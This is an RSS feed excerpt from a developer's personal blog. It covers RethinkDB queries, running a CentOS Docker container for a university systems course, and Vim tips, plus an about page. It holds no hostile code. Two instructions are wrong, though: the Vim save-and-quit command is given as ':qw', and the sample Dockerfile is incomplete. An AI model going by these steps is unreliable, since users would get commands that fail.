</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">res</span>));
</span></span><span style="display:flex;"><span>  });
</span></span></code></pre></div><p>This gets a single ship from the battle_ships table based on the primary key. The primary key is the ID automatically assigned to the inserted JSON. The results we get back in the callback function is the JSON object of the provided key.</p>
<h3 id="update-json-objects">Update JSON objects</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Update the length of The Texas battle ship
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">table</span>(<span style="color:#e6db74">&#39;cruisers&#39;</span>).<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">row</span>(<span style="color:#e6db74">&#34;name&#34;</span>).<span style="color:#a6e22e">eq</span>(<span style="color:#e6db74">&#34;Texas&#34;</span>))
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">update</span>({
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;length&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">33</span>
</span></span><span style="display:flex;"><span>  }).<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">connection</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">res</span>));
</span></span><span style="display:flex;"><span>  });
</span></span></code></pre></div><p>Here, we update a ship&rsquo;s length by providing an updated JSON object. Note that we don&rsquo;t need to provide all fields of the object in order for it to be updated. Once we <code>run</code> the query, the returned result will be what was updated in the database. This snippet also introduces the <code>.filter</code> rethink method. This can be used to pull specific records based on a number of conditions. Finding json objects this way is very powerful and can be chained with other queries. Almost anything you can do with SQL or Mongo, you can do with rethink queries. Check out <a href="https://rethinkdb.com/docs/introduction-to-reql/">this awesome page</a> for some really useful queries.</p>
<h3 id="delete-json-data">Delete JSON data</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Remove the Iowa battle ship
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">db</span>(<span style="color:#e6db74">&#39;ships&#39;</span>).<span style="color:#a6e22e">table</span>(<span style="color:#e6db74">&#39;battle_ships&#39;</span>)
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">row</span>(<span style="color:#e6db74">&#39;name&#39;</span>).<span style="color:#a6e22e">eq</span>(<span style="color:#e6db74">&#39;Iowa&#39;</span>))
</span></span><span style="display:flex;"><span>  .<span style="color:#66d9ef">delete</span>()
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">connection</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">res</span>));
</span></span><span style="display:flex;"><span>    });
</span></span></code></pre></div><p>Here, we again use the <code>.filter</code> method to find a document in the database. Then, we delete it using the <code>.delete()</code> rethink method. After running this query, the JSON will be removed from the database.</p>
<h1 id="conclusion">Conclusion</h1>
<p>I hope that this little dive into RethinkDB has been interesting and has you curious about JSON based databases. Being able to store raw JSON in a NoSQL database is extremely powerful and fits well with JavaScript based architectures.</p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>Virtual machine trouble?? Try Docker!</title>
      <link>https://johncodes.com/posts/docker-trouble/</link>
      <pubDate>Sat, 13 May 2017 22:17:04 -0700</pubDate>
      
      <guid>https://johncodes.com/posts/docker-trouble/</guid>
      <description>If you are a Oregon State CS 344 student, then you&amp;rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!</description>
      <content:encoded><![CDATA[<p>If you are a Oregon State CS 344 student, then you&rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!</p>
<p><em><em>Note:</em></em> when a &ldquo;host&rdquo; is referenced, this is in regard to your own laptop and your own environment, not any container or virtual machine you might have running.</p>
<h3 id="1-get-docker">1. Get Docker</h3>
<p>You can <a href="https://www.docker.com/get-started">download and install Docker at this link</a></p>
<p>Docker creates operating system level virtualizations through &ldquo;containers&rdquo;. It‚Äôs alot like a traditional Virtual Machine, but containers are run through the host system kernel while maintaining their own software libraries and configurations. In short, containers are significantly less expensive as they don&rsquo;t have to spin up their own virtual kernels.</p>
<h3 id="2-start-docker">2. Start docker</h3>
<p>Once you&rsquo;ve installed Docker, fire it up. It will run in the background and give you access to its command line tools.</p>
<h3 id="3-pull-the-centos-image">3. Pull the CentOS image</h3>
<p>Grab the CentOS image with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull centos
</span></span></code></pre></div><p>An image is a template &ldquo;snapshot&rdquo; used to build containers. Images contain the specific configurations and packages that define what a container is.</p>
<h3 id="4-start-the-container">4. Start the container</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -i -t centos
</span></span></code></pre></div><p>This will bring up the CentOS container in interactive mode with the CentOS command line. There are a huge number of flags for running containers, but this is an easy way to directly gain access to the CentOS command line.</p>
<p>Here is the <a href="https://docs.docker.com/engine/reference/run/">docker reference</a> for flags and running an image.</p>
<h3 id="5-install-dev-dependencies">5. Install dev dependencies</h3>
<p>Because this CentOS image is a bare bone, fresh start, linux distro with nothing on it, you will need to install a few unix dev tools. This can easily be done with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>yum groupinstall <span style="color:#e6db74">&#34;Development tools&#34;</span>
</span></span></code></pre></div><p>To install Vim:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>yum install vim
</span></span></code></pre></div><p>If you find that you&rsquo;re missing some tool, try searching online for the install command (make sure to specify CentOS when googling). It is likely a yum command that you&rsquo;re looking for.</p>
<h3 id="6-place-files-onto-container">6. Place files onto container</h3>
<h4 id="using-scp">Using SCP</h4>
<p>You can pull down your files from a server with this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp username@access.engr.oregonstate.edu:~/path/to/smallsh.zip /path/to/destination
</span></span></code></pre></div><h4 id="using-docker-cp">Using Docker cp</h4>
<p>If you have files on your local host machine that you want on the docker container, you can use the built in docker cp command on your host machine:</p>
<pre tabindex="0"><code>docker cp path/to/file/testing.txt &lt;container name&gt;:/path/to/destination
</code></pre><p>This might look something like this:</p>
<pre tabindex="0"><code>docker cp path/to/testing.txt wizardly_montalcini:/path/to/target
</code></pre><p><em>Note:</em> the container needs to be running for this to work!</p>
<p>To find the running container name, use the following command on your host machine:</p>
<pre tabindex="0"><code>docker container ls
</code></pre><p>This will show us something like this. We can find the name on the far right:</p>
<pre tabindex="0"><code>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
4218f505a811        centos              &#34;/bin/bash&#34;         2 minutes ago       Up 2 minutes                            wizardly_montalcini
</code></pre><h3 id="7-work-compile-run">7. Work, Compile, Run</h3>
<p>Now that you have the container running, installed the development dependencies, and pulled your files, you can proceed normally! Work on your program with vim, compile, and run your executable as you would on OS1.</p>
<p>Here&rsquo;s an example of me doing this on a CentOS docker container</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@f30ebeebacde /<span style="color:#f92672">]</span><span style="color:#75715e"># make</span>
</span></span><span style="display:flex;"><span>gcc -Wall -c smallsh.c buffer_io.c utility.c
</span></span><span style="display:flex;"><span>gcc -Wall -o smallsh smallsh.o buffer_io.o utility.o
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@f30ebeebacde /<span style="color:#f92672">]</span><span style="color:#75715e"># ./smallsh</span>
</span></span><span style="display:flex;"><span>:ls
</span></span><span style="display:flex;"><span>README.md      buffer_io.c  etc   lib64         media  proc  sbin       smallsh.c  srv  usr        var
</span></span><span style="display:flex;"><span>anaconda-post.log  buffer_io.o  home  makefile          mnt    root  shelltest  smallsh.h  sys  utility.c
</span></span><span style="display:flex;"><span>bin        dev      lib   mcbridej_smallsh.zip  opt    run   smallsh    smallsh.o  tmp  utility.o
</span></span><span style="display:flex;"><span>:cat README.md
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Smallsh</span>
</span></span><span style="display:flex;"><span>Author: John McBride
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h3 id="8-get-files-off-container">8. Get files off container</h3>
<p>Once you are ready to get your files back, you can use SCP or the built in docker cp command. These are similar to putting your files onto the container, but with the paths switched.</p>
<h4 id="using-scp-1">Using SCP</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp /path/to/file.txt username@access.engr.oregonstate.edu:~/path/to/target
</span></span></code></pre></div><h4 id="using-docker-cp-1">Using docker cp</h4>
<p>On your local host:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker cp &lt;containerId&gt;:/file/path/within/container  /host/path/destination
</span></span></code></pre></div><h3 id="9-using-docker-volumes">9. Using Docker volumes</h3>
<p>There is a better way to get files on and off your container, but it&rsquo;s slightly more complicated. In this example, let&rsquo;s mount a file system <em>volume</em>. You can <a href="https://docs.docker.com/storage/volumes/">read all about volumes</a> and how they are defined by docker. But the quick and dirty way to get files on to a container from your host when you start docker is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ docker run -it -v <span style="color:#e6db74">&#34;/host/user/folder/to/mount:/container/destination&#34;</span> centos 
</span></span></code></pre></div><p>Note the new <code>-v</code> flag followed by a full file path mapping. Let&rsquo;s break it down. The <code>-v</code> command tells docker to mount a volume. The first part of the path preceding the <code>:</code> defines the source directory in the host&rsquo;s filesystem to mount. The path after the <code>:</code> defines the destination inside the container to mount the directory!</p>
<p>Now, when you poke around the container, the files from the source folder will be in the destination folder. The really cool thing about this is that files are persisted across volumes. Or in other words, if you change a file that&rsquo;s been mounted by a volume, it will also be changed on host! This eliminates the need for copy files and folders to and from the container!</p>
<p><em>Much thanks to <a href="https://github.com/nathanperkins">Nathan</a> for pointing out this tidbit!</em></p>
<h3 id="10-exiting-the-container">10. Exiting the container</h3>
<p>You can exit and stop a container in interactive mode with <code>Ctrl d</code></p>
<p>You can detach from a container when in interactive mode with <code>Ctrl p</code> <code>Ctrl q</code>. To re-attach to the container, use the <code>docker attach</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker attach &lt;container name&gt;
</span></span></code></pre></div><p>This would be something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker attach wizardly_montalcini
</span></span></code></pre></div><p>If you need to kill a container, you can use the <code>docker kill</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker kill &lt;container name&gt;
</span></span></code></pre></div><p>Using our example, this would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker kill wizardly_montalcini
</span></span></code></pre></div><p>Warning! Containers are NOT persistent. Again, they are <em><em>NOT persistent.</em></em> Once one is stopped or killed, you will loose everything on it. If you want to keep a container running, just detach from it or make sure to <code>SCP</code> or <code>docker cp</code> your files off the container before you kill it.</p>
<p>If you stop a docker container you can bring it back up with the <code>docker run -i -t centos</code> command.</p>
<h2 id="extras">Extras!</h2>
<p>This section will serve as some docker extras.</p>
<h3 id="centos-docker-hub">CentOS Docker Hub</h3>
<p>The official <a href="https://hub.docker.com/_/centos/">CentOS Docker image</a> from docker hub - This has some interesting tid-bits about security dependencies and installing updates.</p>
<h3 id="dockerfiles">Dockerfiles</h3>
<p>Starting the container and installing the dev dependencies every single time you start it can be kind of annoying. Thankfully, you can use dockerfiles to automate building containers. Here is a sample dockerfile that will build the centos container and install the dev dependencies for us.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">CMD</span> yum groupinstall <span style="color:#e6db74">&#34;Development tools&#34;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>These can get really complicated. <a href="https://www.digitalocean.com/community/tutorials/docker-explained-using-dockerfiles-to-automate-building-of-images">Here is some very useful info</a> on how dockerfiles work, how to use them, and how you can make one that fits your needs.</p>
<p><a href="https://github.com/CentOS/CentOS-Dockerfiles">Here is the official</a> CentOS dockerfile repository on github.</p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title>Vim Tips!</title>
      <link>https://johncodes.com/posts/vim-tips/</link>
      <pubDate>Wed, 22 Mar 2017 21:19:16 -0700</pubDate>
      
      <guid>https://johncodes.com/posts/vim-tips/</guid>
      <description>(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)
I&amp;rsquo;d consider myself some sort of Vim - evangelist. It&amp;rsquo;s an incredible tool and has ALOT of power. If there&amp;rsquo;s something you wish Vim could do, there&amp;rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from.</description>
      <content:encoded><![CDATA[<p>(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)</p>
<p>I&rsquo;d consider myself some sort of Vim - evangelist. It&rsquo;s an incredible tool and has ALOT of power. If there&rsquo;s something you wish Vim could do, there&rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from. Being able to modify files directly on a server is necessary in almost every development sphere.</p>
<h2 id="get-vim">Get Vim</h2>
<p>Most unix like operating systems (including MacOS) should come pre-packaged with Vim. If not, you can install it with yum:</p>
<pre tabindex="0"><code>yum install vim
</code></pre><p>Or apt-get</p>
<pre tabindex="0"><code>sudo apt-get update
sudo apt-get install vim
</code></pre><p>On windows you&rsquo;ll want to use the installation wizard <a href="https://www.vim.org/download.php">provided by the vim organization</a></p>
<p>On MacOS, if for some reason you&rsquo;re missing Vim, you can install it with the Homebrew installer (a great <a href="https://brew.sh/">package manager and installer</a>):</p>
<pre tabindex="0"><code>brew install macvim
</code></pre><h2 id="getting-started">Getting started:</h2>
<h3 id="command-cheat-sheets">Command cheat sheets:</h3>
<p>Cheat sheets are really great to have printed off at your desk for quick reference. Here are a few of my favorites:</p>
<ul>
<li><a href="https://www.fprintf.net/vimCheatSheet.html">fprintf.net</a></li>
<li><a href="https://www.linuxtrainingacademy.com/vim-cheat-sheet/">Linux Training Academy</a></li>
<li><a href="http://vimsheet.com/">VimSheet.com</a></li>
</ul>
<h3 id="interactive-tutorials">Interactive Tutorials</h3>
<ul>
<li>
<p><a href="https://vim-adventures.com/">The Vim browser game</a>
This is a great way to learn the movement keys to get around a file and do basic operations. Here are some other great resources on getting started in Vim:</p>
</li>
<li>
<p>vimtutor
Vim is packaged with its own tutorial named vimtutor! To start the tutorial, simple enter the name of the program! You can exit vimtutor the same way you would normally exit vim (see the section below)</p>
</li>
</ul>
<pre tabindex="0"><code>vimtutor
</code></pre><ul>
<li>
<p><a href="https://medium.com/actualize-network/how-to-learn-vim-a-four-week-plan-cd8b376a9b85">Vim in 4 weeks</a>
A comprehensive, in depth plan to learning the various aspects of Vim. This article gets talked alot about when people are learning Vim.</p>
</li>
<li>
<p>Only use Vim!
If you only use Vim, and don&rsquo;t let yourself use anything else (like sublime text or VS Code), you&rsquo;ll learn fast (but I would recommend going through one of the interactive tutorials first)!</p>
</li>
</ul>
<h2 id="exiting-vim">Exiting Vim:</h2>
<p>Alot of people start up vim and then get frustrated by not being able to save and exit. It&rsquo;s confusing initially! Here are a few different ways to save and exit!</p>
<h3 id="saving-and-exiting">Saving and Exiting</h3>
<ol>
<li>Hit esc to ensure you&rsquo;re in normal mode</li>
<li>Enter the command palette by hitting <code>:</code></li>
<li>Type <code>qw</code> and hit enter. This will &ldquo;write&rdquo; the file and than &ldquo;quit&rdquo; Vim</li>
</ol>
<p>Alternatively: in normal mode, hitting <code>ZZ</code> (yes both capitalized) will save and exit vim for you!</p>
<h3 id="making-a-hard-exit">Making a hard exit</h3>
<ol>
<li>Hit esc to ensure you&rsquo;re in normal mode</li>
<li>Enter the command palette by hitting <code>:</code></li>
<li>Type <code>q!</code> and enter to force vim to quite without writing (saving) anything. Danger! All things you typed since your last &ldquo;write&rdquo; will NOT be saved</li>
</ol>
<h3 id="just-saving">Just saving</h3>
<ol>
<li>Hit esc to ensure you&rsquo;re in normal mode</li>
<li>Enter the command palette by hitting <code>:</code></li>
<li>Type <code>w</code> and enter to &ldquo;write&rdquo; your changes</li>
</ol>
<h2 id="customize-vim">Customize Vim:</h2>
<p>When starting Vim, it will search for a <code>.vimrc</code> file in your home directory (based on your home path name). If you don&rsquo;t have one, you can create one (right in your home directory, usually the same directory as your .bashrc) and use it to customize how vim functions on startup! The following are some basics that everyone should have (The reader should note that &quot; are comments in Vimscript):</p>
<pre tabindex="0"><code class="language-vimscript" data-lang="vimscript">&#34; Turns on nice colors
colo desert
&#34; Turns on the syntax for code. Automatically will recognize various file types
syntax on
</code></pre><p>Placing these (and other vimscript things) into your <code>.vimrc</code> will change the behavior of vim when it starts. Here&rsquo;s a vimscript for setting tabs to be 4 spaces!</p>
<pre tabindex="0"><code class="language-vimscript" data-lang="vimscript">filetype plugin indent on
&#34; show existing tab with 4 spaces width
set tabstop=4
&#34; when indenting with &#39;&gt;&#39;, use 4 spaces width
set shiftwidth=4
&#34; On pressing tab, insert 4 spaces
set expandtab
</code></pre><p>This next one is more involved, but it auto creates closing parenthesis for us! We can see that the <code>h</code> and <code>i</code> in this vimscript are the literal movement commands given to vim after auto completing the parenthesis to get the cursor back to the it&rsquo;s correct position.</p>
<pre tabindex="0"><code class="language-vimscript" data-lang="vimscript">&#34; For mapping the opening paran with the closing one
inoremap ( ()&lt;Esc&gt;hi
</code></pre><p>This should give you a small taste of what vimscript is like and what it&rsquo;s capable of. It can do alot and it&rsquo;s very powerful. If there&rsquo;s something you want Vim to do (like something special with spacing, indents, comments, etc), search online for it. Someone has likely tried to do the same thing and wrote a Vim script for it.</p>
<p><a href="https://www.ibm.com/developerworks/library/l-vim-script-1/index.html">This cool IBM guide</a> goes into some depth with how vim scripting works and what you can build.</p>
<h2 id="search-in-vim">Search in Vim:</h2>
<p>Vim makes it super easy to search and find expressions in the file you have open; it&rsquo;s very powerful.</p>
<p>To search, when in normal mode (hit esc a few times):</p>
<ol>
<li>hit the forward-slash key <code>/</code></li>
<li>Begin typing the phrase or keyword you are looking for</li>
<li>Hit enter</li>
<li>The cursor will be placed on the first instance of that phrase!</li>
<li>While still in normal mode, hit <code>n</code> to go to the next instance of that phrase!</li>
<li>Hitting <code>N</code> will go to the previous instance of that phrase</li>
<li>To turn off the highlighted phrases you searched for, in normal mode, hit the colon <code>:</code> to enter the command palette</li>
<li>Type <code>noh</code> into the command palette to set &ldquo;no highlighting&rdquo; and the highlights will be turned off</li>
</ol>
<h2 id="split-window-view">Split window view!</h2>
<p>You can have two instances of Vim open at once in a split window on the terminal. This is like tmux, but it&rsquo;s managed exclusively by vim!</p>
<h3 id="horizontal-split">Horizontal split</h3>
<p>When in normal mode, enter this into the command palette to enter a horizontal split. The &ldquo;name of file to load&rdquo; is the path to a file you want to open. The path is relative to where Vim was started from.</p>
<pre tabindex="0"><code>:split &lt;name of file to load&gt; 
</code></pre><p>To achieve a vertical split:</p>
<pre tabindex="0"><code>:vsplit &lt;name of file to load&gt;
</code></pre><p>To change the current active panel, (when in normal mode) hit <code>Ctrl w Ctrl w</code> (yes, that&rsquo;s ctrl w twice)</p>
<h2 id="inception">Inception</h2>
<p>Start a bash shell (or any other unix-y command) right in Vim! (in other words, yes Inception is real). When in normal mode, start the command palette and use the following command to bring up a bash shell</p>
<pre tabindex="0"><code>:!bash
</code></pre><p>Note the exclamation mark telling Vim to execute the command.</p>
<p>Here&rsquo;s where it gets crazy. Your initial shell you used to enter Vim is still running. On top of that shell, Vim is running. Now, on top of that, a bash shell instance is now running! It&rsquo;s sort of like an onion with all the layers you can go down into. To get back to Vim, exit your bash instance with the <code>exit</code> command. If you than exit Vim, you will be back to your original shell. A word of warning though, all this job handling and nested processes can get fairly processor hungry. So, if your noticing some chugging, back off alittle on the inception.</p>
<p>You can execute almost any unix command like this. For example:</p>
<pre tabindex="0"><code>:!wc sample.txt
</code></pre><p>This will run the word count program for the sample.txt file! Command inception is crazy cool!</p>
<h2 id="block-comments">Block Comments</h2>
<p>I find this extremely helpful when doing full Vim development. This is taken from the following <a href="https://stackoverflow.com/questions/1676632/whats-a-quick-way-to-comment-uncomment-lines-in-vim">Stack Overflow discussion</a></p>
<p>For commenting a block of text:</p>
<p>&ldquo;First, go to the first line you want to comment, press Ctrl V. This will put the editor in the VISUAL BLOCK mode.</p>
<p>Now using the arrow key, select up to the last line you want commented. Now press Shift i, which will put the editor in INSERT mode and then press #.</p>
<p>This will add a hash to the first line. (if this was a C file, just type //). Then press Esc (give it a second), and it will insert a # character on all other selected lines.&rdquo;</p>
<p>Un-commenting is nearly the same, but in opposite order using the visual block mode!</p>
<h2 id="time-traveling">Time traveling!</h2>
<p>Yes, you heard that right, vim makes time travel possible! Note, this ONLY works within current Vim sessions. So, if you exit vim, you will lose your current session&rsquo;s stack of edits.</p>
<p>On the Vim command palette, which you can enter from Normal mode by hitting the colon <code>:</code>, you can type &rsquo;earlier&rsquo; and &rsquo;later&rsquo; to go back and forth in your current session stack of edits. This is super helpful if you need to revert a few small changes you&rsquo;ve made in the last minute or want to revert everything you did in the last hour. Or if you decide you do want those changes, go forward in time too!</p>
<pre tabindex="0"><code class="language-vimscript" data-lang="vimscript">:earlier 3m
:later 5s
</code></pre><h2 id="plugins">Plugins</h2>
<p>One of the reasons Vim is so great is that there are TONS of awesome plugins for Vim. If you&rsquo;re having a hard time scripting something on your own with vimscript, there&rsquo;s probably a plugin for it! They range anywhere from super useful to super silly. Some of my favorites include the file system NERD tree, the fugitive git client, and ordering pizza with Vim Pizza (yes that&rsquo;s right, you can order pizza with Vim! It can really do it all!)</p>
<p>Check out <a href="https://vimawesome.com/">this great resource</a> for discovering Vim plugins, instructions to install them, and buzz around the Vim community.</p>
<h1 id="conclusion">Conclusion:</h1>
<p>This by no means is a comprehensive guide. There are a ton of great resources for Vim out there and its capabilities. This guide should serve more as a small taste to what Vim can do and maybe peaked your interest to learning more about it.</p>
<p>Take heart! Vim has a steep learning curve, and, like any complex tool set, it takes alot of time and practice to get good with. Google is your friend here.</p>
<p>Feel free to reach out to me if something from this guide was not super clear!</p>
<hr>
<p>If you found this blog post valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<hr>
<script src="https://giscus.app/client.js"
        data-repo="jpmcb/blog"
        data-repo-id="MDEwOlJlcG9zaXRvcnkxMTYxODMyNjg="
        data-category="Blog comments"
        data-category-id="DIC_kwDOBuzQ5M4CTbHW"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="dark_dimmed"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>

]]></content:encoded>
    </item>
    
    <item>
      <title></title>
      <link>https://johncodes.com/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/about/</guid>
      <description>Hi there! üåä My name is John. I&amp;rsquo;m a software engineer at Amazon Web Services where I work on open source software, kubernetes, Linux operating systems, and cloud technology.
This site is my personal landing page and blog. All opinions and views herein are my own opinions and do not reflect those of employer (past, present, future, or interdimensional).
Enjoy!
Support If you find anything I&amp;rsquo;ve done valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.</description>
      <content:encoded><![CDATA[<h1 id="hi-there-">Hi there! üåä</h1>
<p>My name is John. I&rsquo;m a software engineer at Amazon Web Services
where I work on open source software, kubernetes, Linux operating systems, and cloud technology.</p>
<p>This site is my personal landing page and blog.
All opinions and views herein are my <em>own</em> opinions and do <em>not</em> reflect
those of employer (past, present, future, or interdimensional).</p>
<p>Enjoy!</p>
<h4 id="support">Support</h4>
<p>If you find anything I&rsquo;ve done valuable,
consider <a href="https://johncodes.com/index.xml">subscribing to future posts via RSS</a>
or <a href="https://github.com/sponsors/jpmcb">buying me a coffee via GitHub sponsors.</a></p>
<h3 id="contact">Contact</h3>
<p>I can be reached at <a href="mailto:hello@johncodes.com">hello@johncodes.com</a></p>
]]></content:encoded>
    </item>
    
    <item>
      <title></title>
      <link>https://johncodes.com/interview-prep/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://johncodes.com/interview-prep/</guid>
      <description>The No Nonsense Interview Prep The following is interview preperation material for software engineer and development roles that covers the most common aspects of data structures, algorithms, design, and behavioral.
This interview manual is ever evolving; I make changes to it frequently as my experience grows and I find new resources.
